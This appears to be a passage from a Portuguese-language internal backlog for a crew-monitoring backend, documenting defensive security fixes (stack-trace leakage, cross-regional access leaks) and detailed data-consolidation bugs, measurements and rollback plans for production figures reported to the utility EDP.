- **Rollback:** Reverter commit. Volta pra CDN.
- **Depende de:** nada.

## P1-10 — Remover vazamento de stack trace ao cliente

- **Categoria:** Segurança
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js:879` — `stack: err.stack?.split('\n').slice(0,3).join(' | ')`
  no JSON de resposta 500. Expõe estrutura interna, nomes de arquivos,
  linha de código.
- **Impacto:** Baixo mas real. Facilita reconnaissance pra atacante interno.
- **Ação:** Remover o campo `stack` do JSON de resposta. Manter no log
  do servidor (`log.error` com `err.stack` completo).
- **Aceite:**
  - [ ] `curl` numa rota que gera erro não retorna campo `stack` no JSON.
  - [ ] `pm2 logs` ainda mostra stack completo.
- **Esforço:** 5min.
- **Rollback:** Trivial.
- **Depende de:** nada.

## P1-11 — `consolidateDay` transacional (rebaixado de P0-3)

- **Categoria:** Dados
- **Status:** pending
- **Fonte:** Auditoria de dados + pipeline 2026-07-08; rebaixado de P0-3 em 08/07.
- **Evidência:** `services/dataWriter.js:consolidateDay` faz `DELETE` de
  `team_daily_totals` e `team_daily_subcat_totals` (datas d-1, d) seguido de
  reagregação via `upsertTeamDailyTotals`/`upsertSubcatTotals`, **sem
  transação**. Crash entre o DELETE e o INSERT zera o(s) dia(s).
- **Impacto:** Janela de crash zera dados que alimentam o contrato EDP.
  **Já mitigado parcialmente** pelo drift-sweep D-1..D-7 (commit `f8b839b`):
  um dia zerado por crash é detectado e re-consolidado até as 02:00 seguintes.
  A janela de exposição caiu de "indefinida" pra "algumas horas". Por isso
  saiu de P0 pra P1.
- **Por que NÃO foi feito junto com P0-3:** reescrever o coração da
  consolidação (que gera os números do contrato) **sem staging** tem risco
  maior de introduzir um bug de corrupção silenciosa do que a rara janela de
  crash que fecha. Deve ser feito com rede de segurança adequada.
- **Ação (quando houver staging ou janela supervisionada):**
  1. Extrair `_computeSubcatRows(teams)` de `upsertSubcatTotals` (separar o
     fetch de `note_subcategorias` + agregação da gravação — espelhar o que
     já foi feito com `_aggregateTeamDailyTotals`).
  2. No `consolidateDay`: computar `totalRows` (puro) e `subcatRows` (async,
     leitura) ANTES de tocar as tabelas.
  3. Abrir client dedicado via `pgShim._getPool().connect()`:
     `BEGIN` → `DELETE` das datas que efetivamente serão escritas (derivar
     das rows, não fixo [d-1,d], pra não zerar dia sem dados) → `INSERT` das
     rows → `COMMIT`. `ROLLBACK` em qualquer erro.
  4. Teste: `test/consolidate.test.js` com pool fake que lança erro no meio
     (após DELETE, antes do INSERT) e verifica que os dados antigos
     permanecem (ROLLBACK funcionou).
- **Aceite:**
  - [ ] `consolidateDay` usa transação real (BEGIN/COMMIT/ROLLBACK).
  - [ ] Teste de crash-no-meio prova que ROLLBACK preserva dados.
  - [ ] Validado em staging antes de prod.
  - [ ] Deploy com tag de rollback + validação de drift pós-deploy.
- **Esforço:** 1-2 dias (com staging).
- **Rollback:** Reverter o commit. `consolidateDay` volta ao não-atômico
  (coberto pelo drift-sweep).
- **Depende de:** staging (idealmente) ou janela de manutenção supervisionada.

---

## P1-12 — Vazamento regional em 7 rotas que ignoravam `req.scope.regionals`

- **Status:** **done** (14/07/2026)
- **Categoria:** Segurança
- **Reportado por:** José Zouain (14/07/2026): "revisar a parte de acesso de
  cada usuário: sjc, guarapari e cachoeiro". Auditoria rota-a-rota do escopo.
- **Evidência (código à época):** `applyScope`/`requireAdmin` são globais
  (`routes/index.js:92-98`) e populam `req.scope.regionals` (interseção
  `?regionals` × token). Mas 7 rotas **não usavam** `req.scope`, devolvendo
  dados de TODAS as regionais a qualquer usuário logado:
  1. `GET /metas` → `db/queries.js getMetas()` sem filtro.
  2. `GET /metas/calculadas` → `getMetasCalculadas` iterava `['GUA','CAC','SJC']`
     hardcoded (metas + progresso de todas).
  3. `GET /historico/mes` → `getMonthTotals(ym)` sem filtro (totais mensais
     reportados à EDP, todas as regionais).
  4. `GET /historico/diario` → `getDailyHistory(ym)` sem filtro.
  5. `GET /notas/kpis|serie|serie-horaria|por-equipe` → helper `_regionais(req)`
     lia `req.query.regionais` CRU (validava só contra `_REG_VALIDAS`, nunca
     contra o token). Sem param → `null` = "todas" na query. Um user GUA podia
     passar `?regionais=SJC` e ver SJC.
  6. `GET /notas/equipe/:nome` → `getNotasDeEquipe(nome)` sem regional nenhuma.
  7. `GET /teams/:teamId` → `getTeamDetail` (`services/dataService.js:495`)
     varria TODOS os setores casando por id/sigla/nome, sem checar regional —
     expunha notas + colaboradores (ângulo LGPD) de equipe de qualquer regional.
  Contraste que prova ser descuido, não design: `/historico/subcats/*`,
  `/deslocamentos/*`, `/rejeicoes/*`, `/carteira/equipes`, `/totais/*`,
  `/ranking/equipes` TODOS já usavam `req.scope.regionals` corretamente, e
  `db/queries.js` já tinha o padrão `_assertRegionals` + `inRegionals`.
- **Impacto:** leitura cross-regional (não corrompe/grava dado). Viola o
  isolamento regional que P0-4/P0-5/#28 estabeleceram. Decisão do usuário
  (14/07): metas também são confidenciais por regional → escopar tudo.
- **Ação (feita):**
  1. `_regionais(req)` passou a derivar de `req.scope.regionals` (autoritativo),
     nunca mais de `req.query` cru.
  2. `getMetas`, `getMonthTotals`, `getDailyHistory`, `getMetasCalculadas`
     (`db/queries.js`) e `getNotasDeEquipe` (`db/notasQueries.js`) ganharam
     param `regionals` opcional + filtro `inRegionals`/`_regionalParam` +
     defesa em profundidade (descarta linha fora do escopo).
  3. Rotas passam `req.scope.regionals`; `GET`/`POST /metas` respondem escopado
     (admin recebe todas; regional só as suas — inclusive no corpo do POST e no
     fallback `_metasMemory` via `_scopeMetasMemory`).
  4. `GET /teams/:teamId`: 404 (não 403, pra não revelar existência) quando a
     regional da equipe está fora do escopo do user não-admin.
- **Aceite:** ✅ suíte 200/200; ✅ teste novo: `guarapari` pedindo
  `?regionals=SJC` → 403 (applyScope zera interseção); ✅ `GET /metas` de
  `guarapari` devolve só GUA, admin devolve as 3, admin `?regionals=SJC`
  recorta pra SJC. Cobertura 200-path das rotas DB-dependentes fica pro P2-1
  (harness roda sem Postgres).
- **Rollback:** `git revert <hash>`.
- **Nota:** os 3 usuários citados (sjc/guarapari/cachoeiro) presumem-se
  `role=user` com 1 regional cada (SJC/GUA/CAC). Se algum for admin, vê tudo
  por design — checar `AUTH_USERS` no `.env`.

## P1-13 — `_acc` em memória não sobrevive a restart → produção subnotifica em dia de deploy

- **Categoria:** Dados (afeta produção reportada à EDP)
- **Status:** **CÓDIGO done** (22/07/2026) — 2 frentes: (1) `_acc` upgrade de estado
  (commit 47c68cc, P3-11) corrige o AO VIVO daqui pra frente; (2) `consolidateDay`
  agora agrega da UNIÃO de todos os snapshots do dia via `_unionTeamsFromSnapshots`
  (função pura, `test/unionSnapshots.test.js`, 8 testes) — recupera concluídas
  rotacionadas/perdidas. **MEDIÇÃO do contrato (22/07, dry-run união, 75 dias
  09/05→22/07):** recuperável TOTAL só +7% (45.394→48.613). CONCENTRADO EM JULHO:
  mai +4%, jun −1% (ok — NÃO tocar), **jul +21% (+2.877 OS)** = mês dos deploys
  pesados (restarts zeraram o _acc). Hoje 22/07 (código novo o dia todo) deu Δ≈0 =
  fix validado. **RE-CONSOLIDAÇÃO HISTÓRICA: NÃO APLICADA (decisão 22/07).** O
  check do outlier 07-16 mostrou que os números NÃO reconciliam com confiança:
  concluídas brutas subiram a 2171 (17h), caíram pra ~1493 e ficaram (provável
  restart+poda no código antigo); armazenado=623, união=1105, último-bruto=1493,
  pico=2171 — filtros entrelaçados (oficial/rejeitadas/_notaDate/augmentado) impedem
  um modelo fechado do passado. Aplicar um "+21%" não reconciliado violaria "zero
  manipulação de números" (CLAUDE.md regra 7); e subnotificar é o erro SEGURO p/
  empreiteira. Portanto: histórico fica como está; código protege daqui pra frente.
  Retomar SÓ se houver reconciliação por-nota (raw × união × stored com todos os
  filtros explícitos) que dê confiança — investigação maior, não trivial.
- **Fonte:** Investigação do EPJAC34 na auditoria de 22/07/2026.
- **Evidência:** EPJAC34 (1 sessão, sem relogin) teve **13 concluídas distintas**
  ao longo dos snapshots do dia, mas o **último snapshot só tinha 5**. Como os
  snapshots são `_acc`-augmentados (`getTeamsBySector` retorna `augmented` de
  `_accApply`, wpaService.js:1220-1225; `saveSnapshot(teams)` recebe isso),
  a contagem só poderia CAIR se o `_acc` fosse zerado no meio do dia — e foi:
  fizemos ~4 `pm2 restart` (deploys) hoje. `_acc` é in-memory e **não é
  rehidratado no boot** (`_accReset` só limpa; não lê snapshots do dia).
- **Mecanismo do dano:** (1) `upsertTeamDailyTotals` grava com `upsert onConflict`
  = SUBSTITUI o count; pós-restart os ciclos gravam contagem menor e sobrescrevem
  a maior. (2) `consolidateDay` (20:30) re-agrega do ÚLTIMO snapshot por sessão —
  se diminuído por restart, subnotifica. Resultado: **todo dia com deploy mid-day
  pode reportar produção abaixo do real** (a diferença = conclusões que já haviam
  saído da janela ao vivo da WPA e só viviam no `_acc`).
- **Impacto:** MÉDIO-ALTO — number EDP-facing, mas só em dias de deploy no
  expediente; não corrompe (snapshots retidos, reconstruível). Subnotifica (nunca
  infla).
- **Ação (recomendada):** rehidratar o `_acc` no boot a partir dos snapshots de
  HOJE (reconstrói `_acc.notes` e `_acc.carteiras`), pra um restart não perder a
  acumulação do dia. Alternativa/complemento robusto: `consolidateDay` reconstruir
  concluídas/rejeitadas pela **UNIÃO de TODOS os snapshots do dia** (dedup por UUID),
  não só o último — imune a restart E à rotação do `Concluded[]` da WPA.
- **Aceite:** após restart mid-day, o snapshot seguinte mantém a contagem
  acumulada do dia (não cai); `audit-indicadores` estável antes/depois de restart;
  re-consolidação de um dia com restart conhecido recupera o número correto.
- **Esforço:** 4-6h (rehidratação) ou 3-4h (união no consolidateDay) — de
  preferência os dois.
- **Rollback:** reverter o commit.
- **⚠️ Nota:** ao implementar a UNIÃO no consolidateDay, a re-consolidação de
  julho/junho pode AUMENTAR a produção de dias que tiveram deploy (recupera
  conclusões subnotificadas). Rever com o José antes de aplicar em massa.

## P1-14 — Reconexão vira-noite parte a produção do turno em 2 dias

- **Categoria:** Dados (afeta produção reportada à EDP)
- **Status:** pending — **decisão de negócio TRAVADA** (José, 30/07/2026):
  a continuação pertence ao **DIA DO INÍCIO DO TURNO**.
- **Evidência (EPGPR30, plantão, escala 20:00–05:00, `scripts/diag-sessao-equipe`
  ou o one-liner de snapshots):**
  - Sessão A: `begin 2026-07-29T20:05` → `end 2026-07-30T01:08` · 6 concluídas ·
    gravada em `date=2026-07-29`.
  - Sessão B: `begin 2026-07-30T01:10` → `end 2026-07-30T04:00` · 3 concluídas ·
    gravada em `date=2026-07-30`.
  - Gap A→B = **2 minutos** (01:08→01:10). É UMA reconexão da mesma noite, mas
    como o `sessionBegin` da B caiu depois da meia-noite, a atribuição por data
    de início de sessão (`_sessionDate`) jogou a B (e suas 3 concluídas) pro dia
    30/07. No modal de 30/07 aparece "início 01:10" — o rabo da noite, não o
    início real (20:05). O José confirmou: é enganoso e a produção deveria ser
    de uma noite só.
- **Impacto:** produção de um turno noturno com reconexão pós-meia-noite fica
  PARTIDA entre 2 dias. Número reportável à EDP. Sistêmico p/ times noturnos
  (EP plantão, e qualquer escala que cruze 00:00) sempre que houver relogin
  depois da virada. Também confunde o operador no Monitor.
- **Ação proposta (a spec'ar — NÃO fazer edit rápido):**
  1. Regra de **linkagem de sessão**: uma sessão S_nova cujo `sessionBegin` está
     dentro de um gap curto (`RELOGIN_MAX_GAP_HORAS`, já existe em dataService)
     após o `sessionEnd` de uma S_anterior da MESMA equipe é uma **reconexão** —
     herda o dia operacional da S_anterior (mesmo cruzando a meia-noite).
  2. Aplicar a regra em: (a) `_unionTeamsFromSnapshots`/`_sessionDate` (consolidação,
     onde a produção é atribuída ao dia); (b) `_mergeSessionsBySigla` + modal
     (front, pra mostrar a noite inteira como 1 sessão com relogin, início 20:05);
     (c) garantir que o histórico de conexões do modal liste as 2 conexões.
  3. **Função pura testável** pra decisão de linkagem (gap, cross-midnight) +
     `node --test`. Reusar/estender `_resolveLogon` (hoje só same-day).
  4. **Re-consolidar** os dias afetados após o fix (move produção entre dias) —
     medir com dry-run ANTES, revisar com o José (mesma disciplina do P1-13).
- **Aceite:**
  - [ ] Caso EPGPR30 (29–30/07) volta a mostrar a noite como 1 turno (início 20:05,
    relogin 01:10) e as 3 concluídas contam em 29/07.
  - [ ] Teste puro da regra de linkagem (same-day, cross-midnight dentro/fora do gap).
  - [ ] Dry-run da re-consolidação medido e revisado antes de aplicar.
- **Esforço:** 1–2 dias (toca agregação central + re-consolidação + front + testes).
- **Rollback:** reverter commits; re-consolidar os dias de volta (dry-run guarda o antes).
- **Relacionado:** P1-13 (união), P0-6 (janela de consolidação), regra de relogin
  (`_resolveLogon`, dataService, `RELOGIN_MAX_GAP_HORAS`).

## P1-15 — Regra rejeitada>concluída aplicada de forma INCONSISTENTE

- **Categoria:** Dados (produção reportada à EDP)
- **Status:** pending — precisa de **decisão de negócio** antes de qualquer código
- **Fonte:** conferência da planilha manual de um colaborador (L0, 01→25/07/2026).
  Ferramentas: `scripts/diag-listar-notas-subcat.js`, `diag-conferencia-subcat.js`.
- **Evidência (13 equipes ECTSJ8x/9x, L0, 01→25/07):**
  - 2.100 notas concluídas distintas (dedup por UUID).
  - **787** delas têm registro em `note_rejections` (100% com `RejectedAt`).
  - O painel (`team_daily_subcat_totals`) mostra **1.732** → excluiu **368**.
  - Logo **419** notas com rejeição registrada **foram contadas como produção**,
    e 368 do mesmo tipo **não** foram. Mesma característica, tratamento diferente.
  - **Por quê:** `consolidateDay` aplica a regra com as rejeições CONHECIDAS
    naquele momento (+ enriquecimento via `note_rejections`). O coletor de
    rejeições roda de hora em hora e o sweep noturno só reprocessa D-1..D-7 —
    então rejeição coletada depois disso nunca é reavaliada. O resultado passa a
    depender do TIMING da coleta, não do fato.
  - **Ordem no tempo:** nas 787, o `RejectedAt` é ANTERIOR ao `conclusionDate` em
    100% dos casos → são notas rejeitadas e depois REFEITAS. (Hipótese provável
    do porquê não aparece o contrário: nota rejeitada DEPOIS de concluída sai do
    `Concluded[]` da WPA, então não entra nesta amostra. Não confirmado.)
- **Impacto:** ~24% da amostra (419 de 1.732) está num limbo de critério. Não é
  "para mais" nem "para menos" de forma sistemática — é **arbitrário**, e é
  número que vai pra EDP. Também explica parte da divergência com o levantamento
  manual (planilha: 1.824 executadas; painel: 1.732; concluídas cruas: 2.100).
- **REGRA DEFINIDA PELO JOSÉ (30/07/2026) — substitui a de 20/07:**
  > "Se uma nota é rejeitada, na maioria ela é REPROGRAMADA. A nota rejeitada
  > conta para a REJEIÇÃO da equipe que rejeitou. Quando ela for atribuída à
  > mesma equipe ou a OUTRA e essa equipe EXECUTAR, conta como nota EXECUTADA
  > também."
  - São **dois eventos independentes**, podendo ser de equipes diferentes:
    rejeição → conta pra quem rejeitou; execução → conta pra quem executou.
  - Portanto a exclusão cega "está em notasRejeitadas ⇒ não conta como
    executada" (regra 20/07) está **ERRADA** e suprime produção legítima.
  - O que ainda NÃO conta como executada: conclusão **seguida** de rejeição
    (`RejectedAt` > `conclusionDate`) — nesse caso o serviço foi recusado, e era
    esse o caso que a regra de 20/07 pretendia pegar. Ou seja: a regra passa a
    depender da ORDEM DOS EVENTOS, não da simples presença nas duas listas.
- **⚠️ MEDIÇÃO CORRIGIDA (31/07/2026) — a anterior estava ERRADA.** A primeira
  leitura dizia "+368 OS (+21%), painel subnotifica". Era artefato de dois
  defeitos do diagnóstico: (a) comparar MINUTOS (rejeição 1 min antes da
  conclusão virava "nota refeita") e (b) filtrar pelo dia do SNAPSHOT, o que
  incluía notas concluídas em junho. **Conclusão retirada.**
- **VALIDAÇÃO NO PORTAL DA EDP (2 notas, fonte autoritativa):**
  - `030009946354` — Rejeição 30/06 **12:27** · Fim do Trabalho 30/06 **12:27:59**
  - `030009957459` — Rejeição 01/07 **12:20** · Fim do Trabalho 01/07 **12:20:24**
  - Ambas com motivo **“1172 - Pix no WPA”**: o cliente pagou na hora, o corte
    NÃO foi executado. Rejeição e conclusão são **o mesmo evento** — a visita
    terminou em rejeição. Pela regra do José, isso conta como REJEIÇÃO, não como
    produção.
- **⚠️ PREVISÃO (31/07/2026) — ERRADA POR RÉGUA, mantida como registro.** Feita
  com `scripts/diag-impacto-reconsolidacao.js` na sua 1ª versão: previa
  **12.080 → 11.464 = −616 (−5,1%)** em julho 01→25 (tabela inteira: 21.711 →
  19.368 = −2.343). O apply NÃO confirmou. Causa: o script media o "depois" com
  `consolidateDay(D)` filtrado em `r.date === D` — **a mesma régua errada do
  P0-6**. Quem grava o valor final de D é o passe de **D+1**; a régua de D
  subconta ~5%, então o script previa uma queda que era, na verdade, o próprio
  viés da régua. Corrigido no mesmo dia (ambos os scripts passaram a usar D+1,
  igual `detectDrift`) + `scripts/verify-consolidacao.js` criado pra verificar.
- **⚠️ ESTE BLOCO É O 1º APPLY DO DIA. O NÚMERO FINAL ESTÁ NO P1-17 (item 10):**
  julho fechou em **14.998 → 14.064 = −934 (−6,2%)** (01→30, reportável) e junho
  em **13.082 → 13.764 = +682 (+5,2%)** — juntos, **−252 (−0,9%)**. Os −88 abaixo
  são só a 1ª de três passadas do dia.
- **✅ APLICADO (31/07/2026, julho 01→31) — medição direta, tabela antes × depois:**
  - **Reportável (whitelist): 15.005 → 14.917 = −88 OS (−0,6%)** no mês.
    01→25: 12.080 → 11.989. 26→31: praticamente inalterado.
  - Saldo pequeno porque são **duas forças opostas**: o P1-15 tira nota rejeitada
    (pra baixo) e a re-consolidação com a régua de D+1 **devolve** produção que o
    auto-reparo do P0-6 havia derrubado (pra cima) — visível em 21/07 (+6),
    24/07 (+7), 25/07 (+6), justo a janela danificada pelos sweeps de 24–25/07.
  - Quedas concentradas no começo do mês: 02/07 −14, 09/07 −13, 16/07 −28.
  - ✅ Os dias que ficaram **idênticos** neste 1º apply (26, 27, 28, 30/07) eram
    o sintoma do **P1-16** — a exclusão não alcançava a nota carregada de um dia
    anterior. No 2º apply eles caíram −11, −37, −82 e −84.
  - Resolve junto: P0-6 (dias 17–24/07 rebaixados pelos sweeps) e P1-14
    (vira-noite) no mesmo passe.
  - Backup `pg_dump -Fc` de 728M tirado 11:51, íntegro (`pg_restore --list`).
  - ⚠️ O dry-run carrega TAMBÉM o P1-14 (vira-noite), que desloca notas ENTRE
    dias e quase se anula no mês. Pra isolar o P1-15 puro, rodar com
    `RECONEXAO_MAX_GAP_MIN=0`.
  - **Junho e maio NÃO foram re-consolidados** — precisam de medição própria com
    a régua corrigida antes de qualquer decisão.
- **🪤 ARMADILHA DESCOBERTA NO APPLY: o último dia do intervalo não fica selado.**
  `consolidateDay(D)` apaga {D-1, D}; logo, num backfill crescente, cada dia é
  reescrito pelo passe do dia seguinte — **menos o último**, que fica com a régua
  de D (subcontado). Se o fim do intervalo é hoje, o cron das 00:15 sela sozinho;
  se é passado, rodar com 1 dia extra no fim. O `backfill-consolidate` agora
  avisa isso ao terminar.
- **❌ MEDIÇÕES DESCARTADAS (não usar):** as estimativas por extração de snapshot
  (“+368 / +21%”, depois “509 / +42%” em L0, depois “+1.257 jul / −693 jun /
  +3.232 mai”) eram incomparáveis com o painel por dois motivos: atribuíam o dia
  pela data de conclusão (o painel usa `_notaDate`, que joga vira-noite pro dia
  de início do turno) e ignoravam que o painel inclui equipes-fantasma do `_acc`
  (ausentes dos snapshots). O sinal invertendo entre meses foi o que expôs o
  problema. Lição: medir SEMPRE pela própria consolidação em dryRun.
- **CONSEQUÊNCIA MEDIDA (L0, 13 equipes SJC, notas com conclusão em 01→25/07):**
  - 1.957 notas concluídas no período; **734** têm rejeição no MESMO dia
    (visita que terminou em rejeição → não é produção).
  - Produção correta pela regra = **1.223**. O painel mostra **1.732**.
  - Ou seja o painel excluiu só 225 das 734 e **contou 509 como produção**
    → **superestima em 509 (+42% sobre o correto)** nesta amostra.
  - Mesma situação, dois tratamentos → o problema é a INCONSISTÊNCIA.
- **MECANISMO PROVÁVEL (a confirmar no código):** a WPA limpa `notasRejeitadas`
  do payload após algumas horas, então o último snapshot do dia pode já não ter
  a rejeição; o enriquecimento via `note_rejections` no `consolidateDay` casa por
  `session_date IN (D-1, D)` + equipe; e o sweep noturno só re-consolida quando
  `detectDrift` acusa desvio ACIMA do limiar (`max(5, 2%)`) — poucas rejeições
  tardias por dia ficam sob o limiar e nunca são reaplicadas, acumulando ao longo
  do mês.
- **Ação (depois da decisão):**
  1. Tornar a regra determinística e independente do timing da coleta (aplicar
     sobre o estado FINAL da nota, não sobre o que estava no banco naquele dia).
  2. Função pura + teste cobrindo: nunca rejeitada, rejeitada→refeita,
     concluída→rejeitada, múltiplas rejeições.
  3. Dry-run do `backfill-consolidate` medindo o impacto por dia/equipe, revisar
     com o José, só então aplicar.
- **Aceite:**
  - [ ] Regra escrita e aprovada por escrito (vai pra EDP).
  - [ ] Duas notas de exemplo conferidas no portal WPA (fonte autoritativa).
  - [ ] Reconsolidação medida antes de aplicar; painel = regra em 100% da amostra.
- **Esforço:** 1 dia (após a decisão).
- **Rollback:** re-consolidar de volta (dry-run guarda o antes).
- **Relacionado:** regra de 20/07 (`project-regra-rejeitada-vs-concluida`),
  P0-6, P1-14. ⚠️ Nesta apuração 4 diagnósticos meus deram falso positivo antes
  de chegar aqui — validar QUALQUER número novo com 2 caminhos independentes.
- **31/07 (tarde):** a regra foi reformulada pelo José de forma mais estrita e
  revelou que a exclusão estava com a CHAVE ERRADA → ver **P1-16**.

---

## P1-16 — Exclusão de rejeitada casava pelo dia da SESSÃO, não pelo da NOTA

- **Categoria:** Dados (produção reportada à EDP)
- **Status:** **código done** (31/07/2026) — falta medir o impacto e re-consolidar
- **REGRA (José, 31/07/2026) — é ESTA que manda, supera a de 20/07 e detalha a de 30/07:**
  > "Uma visita de uma equipe a uma nota não pode contar como executada por si
  > só; a nota deve ser contada como executada quando for finalizada pela equipe.
  > Se uma equipe vai a uma nota e essa nota é rejeitada, ela deve contar somente
  > como rejeitada para essa equipe. Nos casos em que uma nota é rejeitada por uma
  > equipe (e conta como rejeitada para ela) e essa nota for reprogramada, quando
  > a equipe (seja ela a mesma ou outra) retornar para executar a nota e ela
  > finalizar a nota 100%, ela vai contar como executada somente para a equipe que
  > finalizou ela 100%."
  - Operacionalizada como: rejeição no MESMO dia da conclusão → não é produção;
    DEPOIS → não é produção; ANTES → é produção de quem concluiu. Comparação por
    DIA, não por minuto (a validação no portal mostrou rejeição no mesmo minuto do
    "Fim do Trabalho", motivo "1172 - Pix no WPA").
- **Evidência (reproduzida direto nas funções puras, 31/07):**
  ```
  nota X: concluída sexta 03/07, REJEITADA pela ECTSJ80 na sexta
  sessão de segunda 06/07 da ECTSJ80 ainda carrega X nas concluídas
  chave procurada pelo enrich: 2026-07-06|ECTSJ80   (dia da SESSÃO)
  chave gravada na rejeição:   2026-07-03|ECTSJ80   (dia da NOTA)
  → não casa → X conta como EXECUTADA, lançada em 03/07
  ```
  - A WPA carrega as concluídas **acumuladas** em cada sessão, então toda nota
    reaparece nos passes dos dias seguintes.
  - Agravante: `consolidateDay` grava linhas de dias anteriores **sem wipá-los**
    → o valor inflado **sobrescreve** o dia já correto.
  - Além disso o enrich só buscava `session_date IN (D-1, D)`: mesmo com a chave
    certa, rejeição mais antiga não era carregada.
- **Impacto:** é a **origem medida do P0-7** — tabela acima da régua em 5 dias,
  **4 deles sexta-feira** (03, 10, 17, 24/07), justamente os dias cuja produção
  passa de novo nas sessões de sábado e segunda. Explica também por que o apply
  de julho mexeu tão pouco (−88 OS): o P1-15 corrigia a chave `Date × string`,
  mas a chave em si era do conceito errado.
- **Ação:**
  1. ✅ `_rejIndexByNote(rejRows)` — índice `note_id|team_name` → dias de rejeição,
     usando `rejection_date` (o RejectedAt da WPA) com fallback pra `session_date`.
  2. ✅ `_contaComoExecutada(diasRejeicao, notaDate)` — a regra como função pura.
  3. ✅ 2ª passada no `consolidateDay`: busca rejeições **pelos note_id das
     concluídas** (sem janela de data) e injeta em `notasRejeitadas` quando a
     regra reprova. Injeta em vez de mudar a agregação **de propósito**, pra que
     `_aggregateTeamDailyTotals` e `upsertSubcatTotals` apliquem a MESMA regra —
     caminhos separados fariam a aba de tipos divergir da de subcategorias.
  4. ✅ `test/regraExecutadaRejeitada.test.js` (16 casos) — cada frase da regra
     virou teste, incluindo o vazamento sexta→segunda e "A rejeita, B finaliza".
  5. ✅ **Medido** antes de aplicar: reportável de julho **14.956 → 14.226 =
     −730 (−4,9%)**, com 100 a 490 notas re-somadas por passe (evento
     `consolidate_rejeicao_por_nota`). Os dias que o apply da manhã não havia
     movido — 28/07 e 30/07 — apareceram aqui com −82 e −84, confirmando o
     mecanismo.
  6. ✅ **Aplicado** em 31/07 (`backfill-consolidate 2026-07-01 2026-07-31
     --apply`, backup de 728M às 12:44). Tabela inteira 26.315 → 23.877 (−2.438).
  7. ✅ **Verificado** — e é o que fecha o P0-7: as quatro sextas passaram de
     −56 / −96 / −117 / −84 para **+2 / +3 / +2 / +4**, todos os 31 dias `ok`.
     O `diag-impacto` colapsou de −730 pra **+114 (+0,8%)**, sem nenhum dia
     negativo — a tabela agora subconta de leve (direção conservadora, dentro do
     limiar). Provável causa do resíduo: passes de D+2 fazem upsert de linhas
     `(D, equipe, tipo)` com contagem parcial, sem wipar D. Não investigado a
     fundo — é pequeno (~4 OS/dia) e para o lado seguro.
- **Aceite:**
  - [x] `node --test` 343 → 357 verdes.
  - [x] Impacto medido por dia no recorte da whitelist, revisado com o José.
  - [x] `verify-consolidacao.js` sem drift negativo nas sextas após re-consolidar.
- **Esforço:** fix 1h + medição/apply/verificação ~30min (tudo feito).
- **Rollback:** reverter o commit (volta a contar visita rejeitada como produção)
  e re-consolidar o período.
- **Relacionado:** P1-15 (mesma linha de código, chave diferente), P0-7 (é o
  sintoma), P1-14 (`_effDate` é usado no cálculo do `notaDate` aqui).

---

## P1-24 — `Interruptions[]` vem de graça no `details/optimized` (e ignoramos)

- **Categoria:** Dados
- **Status:** pending
- **Fonte:** 3ª revisão dos scripts Python (14/08/2026).
- **O que descobrimos:** os dois scripts leem `Interruptions[]` (com `Date`, `Try`,
  `Notes`) da resposta do `GET /Notes/{id}/details/optimized` — **o mesmo endpoint
  que nós já chamamos e cujo payload já gravamos em `note_details`.**
  - `services/notaProcessor.js` tem **ZERO** referências a `Interruptions`.
  - O header do `getNoteDetail` documenta `Checkpoints`, `Equipments`, `Seals`,
    `Materials`, `Activities`, `*Note`, `CustomerName`… e **não menciona
    `Interruptions`** — provavelmente nunca notamos o campo.
- **O custo que isso nos gera hoje:** `services/rejectionService.js` busca o motivo
  de rejeição em **endpoints separados por tipo de nota**, com fallback e
  auto-descoberta — e o cabeçalho dele afirma que o dado *"não vem no
  `/Notes/{id}/details/optimized`"*. Consequências registradas lá:
  - `DL`, `LE`, `RL` → **endpoint desconhecido** (todos os candidatos deram 404);
  - tipos raros (`II/PO/UG/RD/SO/DD`) sem amostra;
  - nesses casos a rejeição é gravada com `motivo_codes=[]` + `endpoint_missing`.
- **Hipótese a testar:** se `Interruptions[].Notes` traz o motivo textual (e `Try`
  a tentativa), temos o dado **sem requisição adicional** e **uniforme para todos
  os tipos** — incluindo DL/LE/RL, que hoje ficam sem motivo.
- **Ação:**
  1. ⬜ Pegar 3 notas rejeitadas conhecidas (tipos diferentes, incluindo DL ou LE)
     e inspecionar `Interruptions[]` no `note_details` **já cacheado** — consulta
     local, custo zero, sem tocar na EDP.
  2. ⬜ Comparar com o motivo que o `rejectionService` obteve (quando obteve).
  3. ⬜ Se casar, usar como fonte primária e manter os endpoints por tipo como
     fallback.
- **⚠️** Alimenta a aba Rejeições → medir antes de trocar a fonte.
- **Relacionado:** P1-15, P1-16, P2-13.

> **PREMISSA REVISTA EM 21/08/2026.** Este item (e parte da justificativa do
> P1-33) partia de "DL/LE/RL ficam sem motivo". A medição de cobertura mostrou o
> contrário: DL 1258/1259, LE 1138/1140, RL 563/564 têm `RejectedAt` — a
> auto-descoberta por `FALLBACK_PATHS` resolve esses tipos, e o comentário de
> cabeçalho do `rejectionService.js` que dizia "endpoint desconhecido" estava
> velho. O tipo realmente descoberto era **VL** (1278, 100% sem dado), e a causa
> era estar fora de `CANDIDATE_PATHS` — corrigido no P2-32, sem precisar deste
> item. O que continua valendo aqui é o argumento de CUSTO: `Interruptions[]` já
> vem no `details/optimized` que cacheamos, então usar isso pouparia 1 request
> por nota rejeitada. Deixou de ser "cobrir uma lacuna" e passou a ser
> "economizar rede na conta compartilhada" — o que rebaixa a urgência, mas casa
> com o P2-30.

---

## P1-25 — Outro sistema usa a MESMA conta EDP, com volume alto

- **Categoria:** Operação (continuidade da ingestão)
- **Status:** pending — **alinhamento humano, não código**
- **Fonte:** revisão de `monitor_stc_es.py` (14/08/2026).
- **O problema:** o script usa `clarissa.alves@engelmig.com.br` — a **mesma conta
  que o WPA Monitor usa como `es` para GUA/CAC**. E o volume é alto: janela padrão
  de **15 dias**, sequencial, **1 requisição por nota** em até 4 etapas
  (`details/optimized`, `historic`, `completeInterruptions`, `collaborators`) —
  ordem de dezenas de milhares de requisições por execução.
- **Dois riscos concretos:**
  1. **Lockout compartilhado.** A conta bloqueia após 5 logins falhos. O breaker
     (P1-20) é **por processo** — não enxerga o outro sistema. Se a EDP rotacionar
     a senha da `es`, os dois tentam e se travam mutuamente. Foi o incidente de
     13/08, mas na `sp`.
  2. **Rate limit / saturação.** O sintoma de saturar a EDP está no nosso próprio
     código: *"notas vinham vazias intermitentemente"*. Se GUA/CAC apresentar falha
     intermitente sem causa aparente, esta é hipótese a checar **antes** de
     procurar bug nosso.
- **Ação:**
  1. ⬜ Alinhar: **conta EDP dedicada por sistema** (foi o que fizemos pro SJC).
